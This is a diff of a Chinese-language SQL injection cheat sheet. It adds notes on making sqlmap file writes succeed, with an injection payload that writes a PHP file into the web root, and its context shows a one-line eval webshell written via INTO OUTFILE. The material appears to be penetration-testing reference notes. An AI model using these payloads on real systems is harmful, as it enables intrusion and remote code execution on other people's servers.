@@ -47,6 +47,15 @@ INTO OUTFILE/DUMPFILE
 ```
 SELECT '<? @eval($_POST[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php';
 ```
+*注入拼接写文件payload——sqlmap写文件为空解决方法*：    
+sqlmap写文件为空原因在于查询结果为空所以结尾也没有添加自定义字符     
+因此，1.构造正确查询有结果;2.拼接查询结果
+```
+//输入参数如下，前面查询的语句省略，这是where后的语句
+//后面是字段拼接字符和行拼接字符
+admin' or 'a'='a' LIMIT 0,1 INTO OUTFILE '/var/www/html/re.php' FIELDS TERMINATED BY '-'  LINES TERMINATED BY '<?phpinfo();?>';
+```
+
 其它写webshell方法:[Mysql写入Webshell](https://www.cnblogs.com/xuyangda/p/14510562.html)
 ### 0x03常用常量和函数
 当前用户：     
